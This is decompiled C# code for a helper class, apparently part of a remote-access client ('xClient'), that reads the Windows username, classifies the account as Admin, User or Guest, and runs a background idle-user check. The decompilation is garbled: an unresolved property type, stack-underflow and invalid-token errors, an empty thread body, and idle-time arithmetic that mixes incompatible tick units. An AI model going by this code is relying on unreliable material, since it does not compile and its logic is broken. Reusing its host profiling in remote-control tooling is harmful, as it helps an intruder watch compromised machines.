using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Threading;

namespace xClient.Core.Helper;

public static class WindowsAccountHelper
{
	public static _003F LastUserStatus
	{
		[CompilerGenerated]
		get
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			return _003CLastUserStatus_003Ek__BackingField;
		}
		[CompilerGenerated]
		set
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			_003CLastUserStatus_003Ek__BackingField = /*Error: ldarg 0 (out-of-bounds)*/;
			return /*Error near IL_0007: Stack underflow*/;
		}
	}

	public static string GetName()
	{
		return Environment.UserName;
	}

	public static string GetAccountType()
	{
		using (WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent())
		{
			if (windowsIdentity != null)
			{
				WindowsPrincipal windowsPrincipal = new WindowsPrincipal(windowsIdentity);
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
				{
					return "Admin";
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
				{
					return "User";
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
				{
					return "Guest";
				}
			}
		}
		return "Unknown";
	}

	public static void StartUserIdleCheckThread()
	{
		Thread thread = new Thread(UserIdleThread);
		thread.IsBackground = true;
		thread.Start();
	}

	private static void UserIdleThread()
	{
		//Discarded unreachable code: IL_0006, IL_0008, IL_0019, IL_0020, IL_0030, IL_003a, IL_003c, IL_0044, IL_0054, IL_005e, IL_0060
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Invalid comparison between Unknown and I4
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		/*Error near IL_0001: Invalid metadata token*/;
	}

	private static bool IsUserIdle()
	{
		long num = Stopwatch.GetTimestamp() - NativeMethodsHelper.GetLastInputInfoTickCount();
		num = ((num > 0L) ? (num / 1000L) : 0L);
		return num > 600L;
	}
}
